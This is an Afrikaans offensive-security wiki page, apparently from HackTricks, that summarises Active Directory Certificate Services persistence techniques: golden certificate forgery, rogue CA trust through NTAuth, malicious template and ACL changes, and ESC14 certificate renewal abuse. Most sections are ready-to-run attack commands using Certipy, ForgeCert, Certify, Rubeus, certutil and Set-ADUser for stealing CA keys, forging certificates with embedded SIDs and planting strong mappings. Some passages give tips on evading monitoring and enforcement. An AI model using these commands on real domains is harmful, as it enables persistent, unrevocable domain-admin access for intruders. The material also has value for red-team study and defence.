# AD CS-domeinpersistensie

{{#include ../../../banners/hacktricks-training.md}}

**Dit is ’n opsomming van die domeinpersistensietegnieke wat in [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf) gedeel word**. Raadpleeg dit vir meer besonderhede.<sup>[[5]](#references)</sup>

## Vervalsing van sertifikate met gesteelde CA-sertifikate (Golden Certificate) - DPERSIST1

Hoe kan jy bepaal of ’n sertifikaat ’n CA-sertifikaat is?

Daar kan bepaal word dat ’n sertifikaat ’n CA-sertifikaat is as verskeie voorwaardes nagekom word:<sup>[[5]](#references)</sup>

- Die sertifikaat word op die CA-bediener gestoor, met sy private sleutel beveilig deur die masjien se DPAPI, of deur hardeware soos ’n TPM/HSM indien die bedryfstelsel dit ondersteun.
- Beide die Issuer- en Subject-velde van die sertifikaat stem ooreen met die CA se distinguished name.
- ’n "CA Version"-uitbreiding kom uitsluitlik in CA-sertifikate voor.
- Die sertifikaat bevat nie Extended Key Usage (EKU)-velde nie.

Om die private sleutel van hierdie sertifikaat te onttrek, is die `certsrv.msc`-nutsding op die CA-bediener die ondersteunde metode deur die ingeboude GUI. Hierdie sertifikaat verskil nietemin nie van ander sertifikate wat binne die stelsel gestoor word nie; daarom kan metodes soos die [THEFT2-tegniek](certificate-theft.md#user-certificate-theft-via-dpapi-theft2) vir onttrekking gebruik word.

Die sertifikaat en private sleutel kan ook met Certipy verkry word deur die volgende opdrag te gebruik:<sup>[[2]](#references)</sup>

```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```

Sodra die CA-sertifikaat en sy private sleutel in `.pfx`-formaat verkry is, kan nutsmiddels soos [ForgeCert](https://github.com/GhostPack/ForgeCert) gebruik word om geldige sertifikate te genereer:

```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```

> [!WARNING]
> Die gebruiker wat vir sertifikaatvervalsing geteiken word, moet aktief wees en in staat wees om in Active Directory te verifieer sodat die proses kan slaag. Dit help nie om ’n sertifikaat vir spesiale rekeninge soos krbtgt te vervals nie.

Hierdie vervalste sertifikaat sal **geldig** wees tot die einddatum wat gespesifiseer is en **solank die wortel-CA-sertifikaat geldig is** (gewoonlik van 5 tot **10+ jaar**). Dit is ook geldig vir **masjiene**, dus kan ’n aanvaller, gekombineer met **S4U2Self**, **volhardende toegang op enige domeinmasjien behou** solank die CA-sertifikaat geldig is.\
Boonop kan die **sertifikate wat met hierdie metode gegenereer is**, **nie herroep word nie**, aangesien die CA nie daarvan bewus is nie.

### Bedryf onder Strong Certificate Mapping Enforcement (2025+)

Sedert 11 Februarie 2025 (ná die uitrol van KB5014754) gebruik domeinbeheerders by verstek **Full Enforcement** vir sertifikaatkarterings. Prakties beteken dit dat jou vervalste sertifikate óf moet:

- ’n sterk binding aan die teikenrekening bevat (byvoorbeeld die SID-sekuriteitsuitbreiding), of
- met ’n sterk, eksplisiete kartering op die teikenobjek se `altSecurityIdentities`-kenmerk gepaardgaan.<sup>[[1]](#references)</sup>

’n Betroubare benadering vir volhardende toegang is om ’n vervalste sertifikaat te skep wat aan die gesteelde Enterprise CA gekoppel is, en dan ’n sterk, eksplisiete kartering by die slagoffer se prinsipal te voeg:

```powershell
# Example: map a forged cert to a target account using Issuer+Serial (strong mapping)
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'           # reverse DN format expected by AD
$SerialR = '1200000000AC11000000002B'                  # serial in reversed byte order
$Map     = "X509:<I>$Issuer<SR>$SerialR"             # strong mapping format
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```

Aantekeninge
- As jy vervalste sertifikate kan maak wat die SID-sekuriteitsuitbreiding insluit, sal dit selfs onder Full Enforcement implisiet gekarteer word. Gebruik andersins verkieslik eksplisiete sterk karterings. Sien [account-persistence](account-persistence.md) vir meer inligting oor eksplisiete karterings.
- Herroeping help verdedigers nie hier nie: vervalste sertifikate is onbekend aan die CA-databasis en kan dus nie herroep word nie.

#### Vervalsing wat met Full-Enforcement versoenbaar is (SID-bewus)

Opgedateerde nutsprogramme laat jou toe om die SID direk in te sluit, sodat golden certificates bruikbaar bly selfs wanneer DC's swak karterings verwerp:<sup>[[3]](#references)</sup>

```bash
# Certify 2.0 integrates ForgeCert and can embed SID
Certify.exe forge --ca-pfx CORP-DC-CA.pfx --ca-pass Password123! \
  --upn administrator@corp.local --sid S-1-5-21-1111111111-2222222222-3333333333-500 \
  --outfile administrator_sid.pfx

# Certipy also supports SID in forged certs
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local \
  -sid S-1-5-21-1111111111-2222222222-3333333333-500 -out administrator_sid.pfx
```

Deur die SID in te sluit, vermy jy dat jy aan `altSecurityIdentities` hoef te raak, wat moontlik gemonitor word, terwyl jy steeds aan sterk karteringskontroles voldoen.

## Trusting Rogue CA Certificates - DPERSIST2

Die `NTAuthCertificates`-objek is gedefinieer om een of meer **CA-sertifikate** in sy `cacertificate`-kenmerk te bevat, wat Active Directory (AD) gebruik. Die verifikasieproses deur die **domeinbeheerder** behels dat die `NTAuthCertificates`-objek nagegaan word vir ’n inskrywing wat ooreenstem met die **CA wat gespesifiseer word** in die Issuer-veld van die **sertifikaat** wat vir verifikasie gebruik word. Verifikasie gaan voort as ’n ooreenstemming gevind word.<sup>[[5]](#references)</sup>

’n Aanvaller kan ’n selfondertekende CA-sertifikaat by die `NTAuthCertificates`-objek voeg, mits hulle beheer oor hierdie AD-objek het. Normaalweg kry slegs lede van die **Enterprise Admin**-groep, asook **Domain Admins** of **Administrators** in die **forest-worteldomein**, toestemming om hierdie objek te wysig. Hulle kan die `NTAuthCertificates`-objek wysig met `certutil.exe` en die opdrag `certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA`, of deur die [**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool) te gebruik.

Bykomende nuttige opdragte vir hierdie tegniek:

```bash
# Add/remove and inspect the Enterprise NTAuth store
certutil -enterprise -f -AddStore NTAuth C:\Temp\CERT.crt
certutil -enterprise -viewstore NTAuth
certutil -enterprise -delstore NTAuth <Thumbprint>

# (Optional) publish into AD CA containers to improve chain building across the forest
certutil -dspublish -f C:\Temp\CERT.crt RootCA          # CN=Certification Authorities
certutil -dspublish -f C:\Temp\CERT.crt CA               # CN=AIA
```

Hierdie vermoë is veral relevant wanneer dit saam met ’n metode gebruik word wat vroeër uiteengesit is en ForgeCert gebruik om sertifikate dinamies te genereer.

> Oorwegings vir kartering ná 2025: om ’n rogue CA in NTAuth te plaas, vestig net vertroue in die uitreikende CA. Om leaf-sertifikate vir aanmelding te gebruik wanneer DCs in **Full Enforcement** is, moet die leaf óf die SID-sekuriteitsuitbreiding bevat, óf daar moet ’n sterk, eksplisiete kartering op die teikenobjek wees (byvoorbeeld Issuer+Serial in `altSecurityIdentities`). Sien {{#ref}}account-persistence.md{{#endref}}.

## Kwaadwillige verkeerde konfigurasie - DPERSIST3

Geleenthede vir **volharding** deur **sekuriteitsbeskrywermodifikasies van AD CS**-komponente is volop. Modifikasies wat in die afdeling "[Domain Escalation](domain-escalation.md)" beskryf word, kan kwaadwillig deur ’n aanvaller met verhoogde toegang geïmplementeer word. Dit sluit die byvoeging van "beheerregte" (bv. WriteOwner/WriteDACL/ens.) by sensitiewe komponente in, soos:<sup>[[5]](#references)</sup>

- Die **AD-rekenaarobjek van die CA-bediener**
- Die **RPC/DCOM-bediener van die CA-bediener**
- Enige **afstammende AD-objek of -houer** in **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`** (byvoorbeeld die Certificate Templates-houer, die Certification Authorities-houer, die NTAuthCertificates-objek, ens.)
- **AD-groepe waaraan die organisasie uitdruklik CA- of sjabloonbeheerregte gedelegeer het**. Die ingeboude Cert Publishers-groep is gemagtig om sertifikate na gebruikerobjekte in AD te publiseer; lidmaatskap alleen verleen nie CA- of sjabloonbeheer- of registrasieregte nie. Gaan die toepaslike CA- en sjabloontoestemmings afsonderlik na. Sien [Microsoft se beskrywing van Cert Publishers](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers) en [sertifikaatsjabloontoestemmings](https://learn.microsoft.com/en-us/intune/configmgr/protect/plan-design/planning-for-certificate-template-permissions).

’n Voorbeeld van kwaadwillige implementering behels ’n aanvaller met **verhoogde toestemmings** in die domein wat die **`WriteOwner`**-toestemming by die verstek **`User`**-sertifikaatsjabloon voeg, met die aanvaller as die prinsipaal vir die reg. Om dit te benut, sal die aanvaller eers die eienaarskap van die **`User`**-sjabloon na homself verander. Daarna word **`mspki-certificate-name-flag`** op die sjabloon op **1** gestel om **`ENROLLEE_SUPPLIES_SUBJECT`** te aktiveer, sodat ’n gebruiker ’n Subject Alternative Name in die versoek kan verskaf. Vervolgens kan die aanvaller met die **sjabloon** **registreer**, ’n **domeinadministrateur**-naam as alternatiewe naam kies, en die verkrygde sertifikaat gebruik om as die DA te staaf.

Praktiese instellings wat aanvallers vir langtermyn-volharding in die domein kan aanpas (sien {{#ref}}domain-escalation.md{{#endref}} vir volledige besonderhede en opsporing):

- CA-beleidsvlae wat SAN vanaf versoekers toelaat (bv. deur `EDITF_ATTRIBUTESUBJECTALTNAME2` te aktiveer). Dit hou ESC1-agtige paaie uitbuitbaar.
- Sjabloon-DACL of -instellings wat uitreiking moontlik maak waarmee geverifieer kan word (bv. deur Client Authentication EKU by te voeg of `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` te aktiveer).
- Beheer oor die `NTAuthCertificates`-objek of die CA-houers om rogue uitreikers voortdurend weer in te voer as verdedigers probeer opruim.

> [!TIP]
> In geharde omgewings ná KB5014754 verseker die kombinasie van hierdie verkeerde konfigurasies met eksplisiete sterk karterings (`altSecurityIdentities`) dat jou uitgereikte of vervalste sertifikate bruikbaar bly, selfs wanneer DCs sterk kartering afdwing.

### Misbruik van sertifikaatvernuwing (ESC14) vir volharding

As jy ’n sertifikaat waarmee geverifieer kan word (of ’n Enrollment Agent-sertifikaat) kompromitteer, kan jy dit **onbepaald hernu** solank die uitreikende sjabloon gepubliseer bly en jou CA steeds die uitreikersketting vertrou. Vernuwing behou die oorspronklike identiteitskoppelings maar verleng die geldigheid, wat verwydering moeilik maak tensy die sjabloon reggestel of die CA herpubliseer word.<sup>[[4]](#references)</sup>

```bash
# Renew a stolen user cert to extend validity
certipy req -ca CORP-DC-CA -template User -pfx stolen_user.pfx -renew -out user_renewed_2026.pfx

# Renew an on-behalf-of cert issued via an Enrollment Agent
certipy req -ca CORP-DC-CA -on-behalf-of 'CORP/victim' -pfx agent.pfx -renew -out victim_renewed.pfx
```

As domeinbeheerders in **Full Enforcement** is, voeg `-sid <victim SID>` by (of gebruik ’n template wat steeds die SID-sekuriteitsuitbreiding insluit) sodat die hernude leaf-sertifikaat steeds sterk karteer sonder om aan `altSecurityIdentities` te raak. Aanvallers met CA-administrateurregte kan ook `policy\RenewalValidityPeriodUnits` aanpas om hernude sertifikate se geldigheidstydperk te verleng voordat hulle vir hulself ’n sertifikaat uitreik.<sup>[[2]](#references)[[4]](#references)</sup>


## References

- [1] [Microsoft KB5014754 – Veranderinge aan sertifikaatgebaseerde verifikasie op Windows-domeinbeheerders (afdwingtydlyn en sterk karterings)](https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [2] [Certipy – Opdragverwysing en forge/auth-gebruik](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
- [3] [SpecterOps – Certify 2.0 (geïntegreerde forge met SID-ondersteuning)](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [4] [Oorsig van ESC14-hernuwingmisbruik](https://www.adcs-security.com/attacks/esc14)
- [5] [SpecterOps – Certified Pre-Owned: Misbruik van Active Directory Certificate Services](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)
{{#include ../../../banners/hacktricks-training.md}}
